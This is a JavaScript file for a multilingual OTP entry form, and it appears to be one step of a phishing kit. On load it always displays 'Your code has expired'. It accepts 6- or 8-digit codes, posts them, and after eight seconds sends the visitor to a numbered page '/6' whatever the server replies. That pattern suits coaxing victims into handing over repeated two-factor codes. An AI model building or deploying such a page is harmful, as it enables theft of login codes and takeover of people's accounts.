const messages = {
    en: {
        OTP1: "Don't be careless",
        otp1: "Incorrect OTP entered",
        expired: "Your code has expired"
    },
    it: {
        OTP1: "Non essere distratto",
        otp1: "OTP inserito non corretto",
        expired: "Il tuo codice è scaduto"
    },
    es: {
        OTP1: "No seas descuidado",
        otp1: "OTP ingresado incorrecto",
        expired: " Su código ha expirado"
    },
    de: {
        OTP1: "Sei nicht nachlässig",
        otp1: "Falscher OTP eingegeben",
        expired: " Ihr Code ist abgelaufen"
    },
    fr: {
        OTP1: "Ne sois pas négligent",
        otp1: "OTP incorrect saisi",
        expired: "Votre code a expiré"
    }
};

document.addEventListener('DOMContentLoaded', () => {
    const OTP_err = document.querySelector('.OTP_err');
    const lang = document.documentElement.lang || 'en';
    OTP_err.textContent = messages[lang]?.expired || messages['en'].expired;
});

function validateLength(input) {
    const value = input.value;

    const lang = document.documentElement.lang || 'en';

    if (!/^\d{0,8}$/.test(value)) {
        input.value = value.slice(0, -1); 
    }

    if (value.length > 8) {
        input.value = value.slice(0, 8);
    }
}

function validateForm(event) {
    event.preventDefault(); 
    const OTP = document.querySelector('#OTP2');
    const OTP_err = document.querySelector('.OTP_err');
    const submitButton = document.querySelector('#submitButton');
    const spinner = document.querySelector('.spinner');
    
    OTP_err.textContent = '';

    let isValid = true;
    const lang = document.documentElement.lang || 'en';

    if (OTP.value == "") {
        OTP_err.textContent = messages[lang].OTP1; 
        isValid = false;
    } else if (!/^\d{6}$/.test(OTP.value) && !/^\d{8}$/.test(OTP.value)) {
        OTP_err.textContent = messages[lang].otp1; 
        isValid = false;
    }

    if (isValid) {
        submitButton.classList.add('loading');
        spinner.style.display = "inline-block";
        submitButton.querySelector('.button-text').style.display = 'none';

        const formData = new FormData(event.target);
        fetch(event.target.action, {
            method: 'POST',
            body: formData
        }).then(response => {
            setTimeout(() => {
                window.location.href = '/6';
            }, 8000);
        }).catch(error => {
            console.error("Error when sending data:", error);
            spinner.style.display = 'none';
            submitButton.querySelector('.button-text').style.display = 'inline';
            alert("An error occurred while sending the data, please try again.");
        });
    }
}